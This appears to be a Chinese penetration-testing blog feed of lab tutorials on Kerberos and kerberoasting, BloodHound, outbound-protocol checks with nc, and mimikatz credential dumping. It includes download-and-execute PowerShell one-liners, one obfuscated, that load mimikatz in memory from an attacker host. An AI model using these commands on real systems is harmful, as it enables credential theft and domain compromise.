    <content type="html"><![CDATA[<p>本文介绍kerberos的相关知识以及利用攻击方法</p><a id="more"></a><p>攻击机：kali：192.168.43.30</p><p>客户机DC：win2012：192.168.8.211</p><p>客户机：win7： 182.168.8.57</p><h2 id="1-kerberos介绍"><a href="#1-kerberos介绍" class="headerlink" title="1.kerberos介绍"></a>1.kerberos介绍</h2><p>在古希腊神话中Kerberos指的是：有着一只三头犬守护在地狱之门外,禁止任何人类闯入地狱之中。而现实中的Kerberos是一种网络身份验证协议,旨在通过密钥加密技术为客户端/服务器应用程序提供身份验证,主要用在域环境下的身份验证。</p><p>Kerberos是一种由MIT （麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。</p><p>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为 客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</p><p><img src="/2020/10/10/kerberos/image-20210202131840081.png" alt="image-20210202131840081"></p><h3 id="1-域认证所参与的角色"><a href="#1-域认证所参与的角色" class="headerlink" title="1.域认证所参与的角色:"></a>1.域认证所参与的角色:</h3><ul><li>访问服务的client</li><li>提供服务的server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)密钥分发中心，一般为域控制器 </li></ul><p>票据(Ticket ):是网络对象互相访问的凭证。TGT ( Ticket Granting Ticket ):入场券，通过入场券能够获得票据，是一种临时凭证的存在。<br>KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成:</p><ul><li>Authentication Service:为client生成TGT的服务，简称AS</li><li>Ticket Granting Service: 为client生成某个服务的ticket，简称TGS。 </li></ul><p>另外还需要介绍一个类似于本机SAM的一个数据库:AD，全称叫account database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p><img src="/2020/10/10/kerberos/image-20210202014237001.png" alt="image-20210202014237001"></p><p>KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号。在整个kerberos认证中会多次用到它的Hash值去做验证。</p><p><img src="/2020/10/10/kerberos/image-20210202014455121.png" alt="image-20210202014455121"></p><h3 id="2-域认证粗略流程"><a href="#2-域认证粗略流程" class="headerlink" title="2.域认证粗略流程"></a>2.域认证粗略流程</h3><p>1.client向kerberos服务请求，希望获取访问server的权限。kerberos得到了这个消息，首先得判断client是否是可信赖的，也就是白名单黑名单的说法。这就是AS服务完成的工作，通过在AD中存储黑名单和白名单来区分client。成功后，返回AS返回TGT给client.</p><p>2.client得到了TGT后，继续向kerberos请求，希望获取访问server的权限。kerberos又得到了这个消息，这时候通过client消息中的TGT，判断出了client拥有了这个权限，给了client访问server的权限ticket。</p><p>3.client得到ticket后，终于可以成功访问server。这个ticket只是针对这个server,其他server需要向TGS申请。</p><p>The Authentication Service Exchange: Client与 AS 的交互;(请求TGT)</p><p>The Ticket-Granting Service (TGS)Exchange: Client 与 TGS的交互;(请求ServerTicket)</p><p>The ClientlServer Authentication Exchange: Client 与 Server的交互。(访问)</p><p><img src="/2020/10/10/kerberos/image-20210202015026043.png" alt="image-20210202015026043"></p><h3 id="3-域认证"><a href="#3-域认证" class="headerlink" title="3.域认证:"></a>3.域认证:</h3><ul><li><p><strong>第一步:Client 与 AS 的交互</strong><br>首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash.<br>KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT. </p><ul><li><p>Session Key用于客户端向TGS服务通信。</p></li><li><p>域内所有网络对象的凭证都在AD中保存.。</p></li><li><p>KDC中某个用户指的是krbtgt</p><p><strong>具体流程:</strong></p><p>KRB_AS_REQ<br>client-&gt;AS:发送Authenticator1(Client密码加密TimeStamp)<br>第一步client 先向KDC的AS 发送Authenticator1，内容为通过client密码 Hash加密的时间戳、ClientID、网络地址、加密类型等内容。</p></li></ul></li></ul><p><img src="/2020/10/10/kerberos/image-20210202015819837.png" alt="image-20210202015819837"></p><p>​                KRB_AS_REP<br>​                AS-&gt; Client:发送 client密码加密的sessionkey-as和票据TGT(KRBTGT HASH加密的sessionkey-as和TimeStamp)<br>​                在KDC中存储了域中所有用户的密码HASH，当AS接收到Client的请求之后会根据KDC中存储的密码来解密，解密成功并且验证                信息。验证成功后返回给client 由 client密码HASH加密的sessionkey-as 和TGT (由KRBTGT HASH加密的sessionkey-as和Timestamp等信息)。<br>​                其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket. </p><ul><li><strong>第二步:Client 与 TGS 的交互,Client使用TGT从KDC获得基于某个Server的Ticket</strong><br> 客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。<br> KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。<br> 验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了<br> Server Hash:这个Hash是在AD中服务器计算机的NTLM Hash。</li></ul><p>​    <strong>具体流程:</strong><br>  Client -&gt;TGS 发送 Authenticator2(sessionkey-as加密Timestamp)和票据TGT(KRBTGTHASH加密的sessionkey-as和Timestamp)<br>  Client接收到了加密后的Sessionkey-as 和TGT之后，用自身密码解密得到sSessionkey-as,TGT是由KDC 密码加密，Client 无法解密。这时Client再用Sessionkey-as加密 TimeStamp和TGT一起发送给KDC 中的TGS ( TicketGranting Server )票据授权服务器换取能够访问Server的票据。</p><p><img src="/2020/10/10/kerberos/image-20210202021236912.png" alt="image-20210202021236912"></p><p>​    TGS-&gt; Client 发送密文1(sessionkey-as 加密sessionkey-tgs)和票据ST(Server密码 HASH加密sessionkey-tgs)</p><p>​    TGS 收到Client 发送过来的TGT和Sessionkey-as 加密的Timestamp 之后，首先会检查自身是否存在Client所请求的服务。如果服务存在，则用KRBTGT密码解密TGT。一般情况下TGS 会检查TGT中的时间戳查看TGT是否过期，且原始地址是否和TGT中保存的地址相同。验证成功之后将用sessionkey-as加密的sessionkey-tgs 和Server密码 HASH加密的Sessionkey-tgs 发送给client。</p><ul><li><p><strong>第三步:Client 与 Server 的交互–双向验证</strong><br>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。 </p><ul><li><p>Ticket客户端无法解密</p></li><li><p>服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)。</p></li><li><p>比较时间长度</p><p><strong>具体流程:</strong></p><p>client -&gt;Server 发送Authenticator3(sessionkey-tgs 加密TimeStamp)和票据ST(Server密码HASH加密sessionkey-tgs)<br>client 收到sessionkey-as 加密的sessionkey-tgs 和Server密码 HAsA加密的sessionkey-tgs 之后用sessionkey-as解密得到sessionkey-tgs，然后把sessionkey-tgs 加密的<br>Timestamp和 ST一起发送给Server.</p><p><img src="/2020/10/10/kerberos/image-20210202021708277.png" alt="image-20210202021708277"></p><p>Server-&gt; Client<br>server通过自己的密码解密ST，得到 sessionkey-tgs,再用sessionkey-tgs解密Authenticator3得到Timestamp，验证正确返回验证成功。<br>校验通过后，认证成功，该票据会一直存在客户端内存中。 </p></li></ul></li></ul><h3 id="4-PAC"><a href="#4-PAC" class="headerlink" title="4.PAC"></a>4.PAC</h3><p>在Kerberos最初设计的几个流程里说明了如何证明client 是client而不是由其他人来冒充的，但并没有声明client有没有访问Server服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。<br>所以微软为了解决这个问题在实现 Kerberos 时加入了PAC的概念，PAC的全称是<strong>PrivilegeAttribute Certificate(特权属性证书)**。可以理解为火车有一等座，也有二等座，而</strong>PAC就是为了区别不同权限的一种方式。**</p><h4 id="1-PAC的实现"><a href="#1-PAC的实现" class="headerlink" title="(1)PAC的实现"></a>(1)PAC的实现</h4><p>当用户与KDC之间完成了认证过程之后，Client需要访问Server所提供的某项服务时，Server为了判断用户是否具有合法的权限需要将client 的 User SID等信息传递给KDC,KDC通过SID判断用户的用户组信息，用户权限等，进而将结果返回给Server，Server再将此信息与用户所索取的资源的ACL进行比较，最后决定是否给用户提供相应的服务。<br>PAC会在 KRB_AS_REP中AS 放在TGT里加密发送给Client，然后由Client转发给TGS来验证Client所请求的服务。<br>在PAC中包含有两个数字签名PAC_SERVER_CHECKSuM和PAC_PRIVSVR_CHECKSUM，这两个数字签名分别由Server端密码HASH和KDC的密码HASH加密。<br>同时TGS解密之后验证签名是否正确，然后再重新构造新的PAC放在ST里返回给客户端，客户端将ST发送给服务端进行验证。</p><h4 id="2-Server-与-KDC"><a href="#2-Server-与-KDC" class="headerlink" title="(2)Server 与 KDC"></a>(2)Server 与 KDC</h4><p>PAC可以理解为一串校验信息，为了防止被伪造和串改，原则上是存放在TGT里，并且TGT由KDC hash加密。<strong>同时尾部会有两个数字签名，分别由KDC密码和server密码加密，防止数字签名内容被篡改</strong></p><p><img src="/2020/10/10/kerberos/image-20210202022906946.png" alt="image-20210202022906946"></p><p>同时 PAC指定了固定的User SID和Groups ID，还有其他一些时间等信息，Server的程序收到ST之后解密得到PAC 会将PAC的数字签名发送给KDC，KDC再进行校验然后将结果已RPC返回码的形式返回给Server.</p><p><img src="/2020/10/10/kerberos/image-20210202022957560.png" alt="image-20210202022957560"></p><h3 id="5-SPN"><a href="#5-SPN" class="headerlink" title="5.SPN"></a>5.SPN</h3><h4 id="1-SPN定义"><a href="#1-SPN定义" class="headerlink" title="1.SPN定义"></a>1.SPN定义</h4><p>服务主体名称( SPN )是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必预具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN.</p><p>全称Service Principal Names</p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN<br>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p><p>当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><h4 id="2-SPN格式"><a href="#2-SPN格式" class="headerlink" title="2.SPN格式"></a>2.SPN格式</h4><pre><code class="hljs vala">servicelass/host:port/servicename<span class="hljs-meta"># serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNSHOST等</span><span class="hljs-meta"># host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</span><span class="hljs-meta"># 如果服务运行在默认端口上，则端口号(port)可以省略</span></code></pre><p><img src="/2020/10/10/kerberos/image-20210202023344004.png" alt="image-20210202023344004"></p><h4 id="3-查询SPN"><a href="#3-查询SPN" class="headerlink" title="3.查询SPN"></a>3.查询SPN</h4><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测<br>1、使用SetSPN<br>Win7和Windows Server2008自带的工具</p><p>查看当前域内的所有SPN：<code>setspn.exe -q */*</code></p><p><img src="/2020/10/10/kerberos/image-20210202023724091.png" alt="image-20210202023724091"></p><p>查看指定的域：<code>setspn.exe -T test -q */*</code></p><p><img src="/2020/10/10/kerberos/image-20210202023857881.png" alt="image-20210202023857881"></p><p>2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系这里举一个例子:<br>用户a要访问MySQL服务的资源，进行到4.tgs_reply时，步骤如下:</p><p>(1)Domain Controller查询MySQL服务的SPN<br>如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户<br>如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</p><p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p><p>3、域内的主机都能查询SPN</p><p>4、域内的任何用户都可以向域内的任何服务请求TGs</p><p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解<br>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p><p><strong>因此，高效率的利用思路如下:</strong></p><p>1.查询SPN，找到有价值的SPN，需要满足以下条件:<br>    1.该SPN注册在域用户帐户(Users)下<br>    2.域用户账户的权限很高</p><p>2.请求TGS</p><p>3.导出TGS</p><p>4.暴力破解</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kerberos介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bloodhound+sharphound</title>
    <link href="/2020/10/09/bloodhound-sharphound/"/>
    <url>/2020/10/09/bloodhound-sharphound/</url>
    
    <content type="html"><![CDATA[<p>本文介绍域内一神器的简单安装和使用</p><a id="more"></a><p><strong>sharphound</strong>：<a href="https://github.com/BloodHoundAD/SharpHound3">https://github.com/BloodHoundAD/SharpHound3</a></p><p>使用sharphound将目标及的域信息打包下来。</p><p>可将sharphound集成到cs中，方便一点</p><p><img src="/2020/10/09/bloodhound-sharphound/1.png" alt="1"></p><p><img src="/2020/10/09/bloodhound-sharphound/2.png" alt="2"></p><p>用插件将其数据打包，会生成一个zip文件</p><p><img src="/2020/10/09/bloodhound-sharphound/3.png" alt="3"></p><p>然后用cs将其下载到本地</p><p><img src="/2020/10/09/bloodhound-sharphound/4.png" alt="4"></p><p><img src="/2020/10/09/bloodhound-sharphound/5.png" alt="5"><br>后面只需将压缩包上传到bloodhound分析即可。</p><p><strong>bloodhound安装</strong></p><pre><code class="hljs sql">apt-get <span class="hljs-keyword">update</span>  apt-<span class="hljs-keyword">get</span> dist-<span class="hljs-keyword">upgrade</span><span class="hljs-comment">#软件包更新</span>apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> bloodhound<span class="hljs-comment">#下载安装bloodhound</span></code></pre><p>启动</p><pre><code class="hljs crmsh">neo4j <span class="hljs-literal">start</span>bloodhound</code></pre><p>启动后，账户密码默认是Neo4j</p><p><img src="/2020/10/09/bloodhound-sharphound/6.png" alt="6"></p><p>不过第一次登录会提示你到浏览器修改密码，初次登录默认账户密码都是neo4j，修改成功后，再登录bloodhound，账户任然是neo4j，密码是新密码(记录一下我的是neo4j123)</p><p>使用上传数据的功能将zi包解压后的jsv文件上传，之后会自动分析。</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>出网协议判断</title>
    <link href="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/"/>
    <url>/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/</url>
    
    <content type="html"><![CDATA[<p>本文介绍常见几种出网协议的判断方法以及一款工具bloodhound</p><a id="more"></a><p>常见的出网协议有tcp、dns、http、icmp</p><h3 id="1-tcp协议"><a href="#1-tcp协议" class="headerlink" title="1.tcp协议"></a>1.tcp协议</h3><p>在目标机上传一个nc，攻击机监听：<code>nc -lvp 4444</code></p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201144513817.png" alt="image-20210201144513817"></p><p>目标机执行，连接攻击机：<code>nc 192.168.43.30 4444</code></p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201144536584.png" alt="image-20210201144536584"></p><p>攻击机连接成功，代表目标可以tcp协议出网</p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201144609089.png" alt="image-20210201144609089"></p><h3 id="2-dns协议"><a href="#2-dns协议" class="headerlink" title="2.dns协议"></a>2.dns协议</h3><p>攻击机开启监听53端口：<code>nc -u -lvp 53</code></p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201144713874.png" alt="image-20210201144713874"></p><p>目标执行：<code>nslookup [www.baidu.com](http://www.baidu.com) vps-ip  </code>(linux使用：<code>dig @vps-ip www.baidu.com</code>)</p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201144938517.png" alt="image-20210201144938517"></p><p>攻击机连接成功，说明目标可以dns出网</p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201145007065.png" alt="image-20210201145007065"></p><h3 id="3-http协议"><a href="#3-http协议" class="headerlink" title="3.http协议"></a>3.http协议</h3><p>攻击机监听80端口：<code>nc -lvp 80</code></p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201145103774.png" alt="image-20210201145103774"></p><p>目标及访问攻击机ip：<code>curl vps-ip:80</code>（低版本的Windows直接访问：<code>vps-ip:80</code>）</p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201145304735.png" alt="image-20210201145304735"></p><p>攻击机得到http请求，目标及可以http协议出网</p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201145319587.png" alt="image-20210201145319587"></p><h3 id="4-icmp协议"><a href="#4-icmp协议" class="headerlink" title="4.icmp协议"></a>4.icmp协议</h3><p>目标机ping外网机器，若能成功，代表可以icmp出网</p><p><img src="/2020/10/09/%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD-bloodhound/image-20210201145406077.png" alt="image-20210201145406077"></p><p>.</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>    - tcp、dns、http、icmp出网协议判断</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码抓取</title>
    <link href="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    <url>/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<p>本文介绍几种抓取密码的工具以及一些高版本操作系统绕过方式。</p><a id="more"></a><p>攻击机：kali：192.168.43.30</p><p>客户机：win7：192.168.43.78</p><p>客户机DC：win2012：192.168.43.211</p><p>下列有关在win7上没有复现成功的，在win2008上复现成功，没有贴图。</p><h2 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1.mimikatz"></a>1.mimikatz</h2><p>github项目：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><h3 id="1-可执行程序使用"><a href="#1-可执行程序使用" class="headerlink" title="1.可执行程序使用"></a>1.可执行程序使用</h3><p>分为32位和64位的架构程序，配有动态链接库和sys文件，在目标机器中应该将这两个文件均传上去。</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131165644837.png" alt="image-20210131165644837"></p><p>一些简单的用法</p><pre><code class="hljs elixir">CRYPTO::Certificates-列出/导出凭证。KERBEROS::Golden -创建黄金票证/白银票证/信任票证。KERBEROS::List/export -列出/导出在用户的内存中所有用户的票证(TGT 和TGS)。KERBEROS::PTT -票证传递。LSADUMP::DCSync -向DC发起同步一个对象（获取帐户的密码数据)的质询。LSADUMP::LSA -向LSA Server质询检索SAM/AD 的数据（正常或未打补丁的情况下),导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgtLSADUMP::SAM - 获取 SysKey来解密SAM 的项目数据（从注册表或者 hive 中导出)，SAM选项连接到本地安全帐户管理器(SAM)数据库，并能转储本地帐户的凭证。可以用来转储windows计算机上的所有的本地凭据。LSADUMP::Trust-向LSA Server质询来获取信任的认证信息（正常或未打补丁的情况），转储所有关联的信任(域/林)的信任密钥(密码).MISC::AddSid - 将用户帐户添加到SID历史记录。第一个值是目标帐户，第二值是帐户/组名称(或SID).移至SID：自<span class="hljs-number">2016年5</span>月<span class="hljs-number">6</span>日起修改.MISC::MemSSP - 注入恶意的 wndows SSP来记录本地身份验证凭据。MISC::Skeleton -在DC 中注入万能钥匙( Skeleton Key)到LSASS进程中。这使所有用户对经过Skeleton Key修补的DC的身份验证都可以使用<span class="hljs-string">&quot;主密码&quot;</span>(也称为Skeleton Key)以及其通常的密码.PRIVILEGE::Debug - 获得Debug 权限(此命令前提需要administer权限，很多Mimikatz命令需要Debug 权限或<span class="hljs-string">&quot;本地系统&quot;</span>权限).SEKURLSA::Ekeys -列出 Kerberos密钥SEKURLSA::Kerberos -列出所有已通过认证的用户的 Kerberos 凭证(包括服务帐户和计算机帐户)的Kerberos凭据SEKURLSA::Krbtgt -获取域中Kerberos服务帐户(KRBTGT)的密码数据。SEKURLSA::LogonPasswords -列出所有可用的提供者的凭据。列出明文密码，但win2012之后不行，系统不会保存为明文密码SEKURLSA::Pth -Hash传递和Key传递(注<span class="hljs-symbol">:Over-Pass-the-Hash</span> 的实际过程就是key传递）SEKURLSA::Tickets -列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户的上下文中运行的服务.与kerberos::list不同，sekurlsa使用内存读取，并且不受密钥导出限制.sekurlsa可以访问其他会话(用户)的票证.TOKEN::List –列出系统的所有令牌TOKEN::Elevate -假冒令牌。用于提升权限至SYSTEM 权限（默认情况下)或者是发现域管理员令牌TOKEN::Elevate /domainadmin - 假冒一个拥有域管理员凭证的令牌。</code></pre><h3 id="2-msf加载mimikatz"><a href="#2-msf加载mimikatz" class="headerlink" title="2.msf加载mimikatz"></a>2.msf加载mimikatz</h3><p>先利用木马反弹一个会话，以下操作均是在msf5下完成，不同版本命令有差异。</p><p>加载mimikatz：<code>load mimikatz</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131174013325.png" alt="image-20210131174013325"></p><p><code>wdigest</code>列出目标的明文密码，更低版本Windows能直接列出来</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131175535662.png" alt="image-20210131175535662"></p><p><code>tspkg</code>：需要system权限，尝试列出目标明文密码，不一定成功</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131175845116.png" alt="image-20210131175845116"></p><p><code>msv</code>：抓取密码的hash</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131175903296.png" alt="image-20210131175903296"></p><p><code>mimikatz_command -f </code>：自定义命令，使用mimikatz可执行程序的命令，例如抓取明文密码</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131180210948.png" alt="image-20210131180210948"></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131180405356.png" alt="image-20210131180405356"></p><h3 id="3-cs加载mimikatz"><a href="#3-cs加载mimikatz" class="headerlink" title="3.cs加载mimikatz"></a>3.cs加载mimikatz</h3><p>利用木马得到一个会话后，开启mimikatz</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131181030025.png" alt="image-20210131181030025"></p><p>开启后，会默认抓取目标主机明文密码</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131181108775.png" alt="image-20210131181108775"></p><p>cs抓取后的信息均可以在凭证获取</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131181306677.png" alt="image-20210131181306677"></p><p>Hashdump-抓取密码的hash</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131181555323.png" alt="image-20210131181555323"></p><h3 id="4-powershell版mimikatz"><a href="#4-powershell版mimikatz" class="headerlink" title="4.powershell版mimikatz"></a>4.powershell版mimikatz</h3><p>powershell地址： <a href="https://github.com/DanMcInerney/Invoke-Cats">https://github.com/DanMcInerney/Invoke-Cats</a></p><h4 id="1-落地执行"><a href="#1-落地执行" class="headerlink" title="1.落地执行"></a>1.落地执行</h4><p>导入模块：<code>Import-Module .\Invoke-Cats.ps1</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131182614968.png" alt="image-20210131182614968"></p><p>执行命令：<code>Invoke-Cats -pwds</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131182705563.png" alt="image-20210131182705563"></p><h4 id="2-内存执行，远程加载"><a href="#2-内存执行，远程加载" class="headerlink" title="2.内存执行，远程加载"></a>2.内存执行，远程加载</h4><p><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadingString(powershell_adress);Invoke-Cats -pwds&quot;</code></p><p>这个脚本执行出错不知道为啥。。。</p><p>另外一个版本powershell：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></p><p>执行</p><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.0.101/Invoke-ReflectivePEInjection.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-ReflectivePEInjection</span> <span class="hljs-literal">-PEUrl</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.101</span>/mimikatz.exe <span class="hljs-literal">-ExeArgs</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-literal">-ForceASLR</span></code></pre><h4 id="3-混淆后远程加载"><a href="#3-混淆后远程加载" class="headerlink" title="3.混淆后远程加载"></a>3.混淆后远程加载</h4><p><code>powershell -c &quot; (&#39;IEX &#39;+&#39;(Ne&#39;+&#39;w-O&#39;+bject Ne&#39;+&#39;t.W&#39;+&#39;ebClien&#39;+&#39;t).Do&#39;+&#39;wnloadingS&#39;+&#39;trin&#39;+&#39;g&#39;+&#39;(&#39;+&#39;1vchttp://&#39;+&#39;192.168.1&#39;+&#39;.101/&#39;+&#39;Inv&#39;+&#39;oke-Mimik&#39;+&#39;a&#39;+&#39;tz.&#39;+&#39;ps11v&#39;+&#39;c)&#39;+&#39;;&#39;+&#39;I&#39;+&#39;nvoke-Mimika&#39;+&#39;tz&#39;).REplaCE(&#39;1vc&#39;,[STRing][CHAR]39)|IeX&quot;</code></p><h3 id="5-NET2-0加载mimikatz"><a href="#5-NET2-0加载mimikatz" class="headerlink" title="5 .NET2.0加载mimikatz"></a>5 .NET2.0加载mimikatz</h3><p>mimikatz.cs：<a href="https://gist.githubusercontent.com/nicholasmckinney/896b508b6cf1e8c3e567ccab29c8d3ec/raw/afa7219adbfcdfc160c163273ef8ec61ff0658b4/katz.cs">https://gist.githubusercontent.com/nicholasmckinney/896b508b6cf1e8c3e567ccab29c8d3ec/raw/afa7219adbfcdfc160c163273ef8ec61ff0658b4/katz.cs</a></p><p>将katz.cs放置于C:\Windows\Microsoft.NET\Framework\v2.0.50727</p><p>在powershell下执行</p><pre><code class="hljs cos"><span class="hljs-built_in">$key</span> = &#x27;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+<span class="hljs-number">6</span>zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU<span 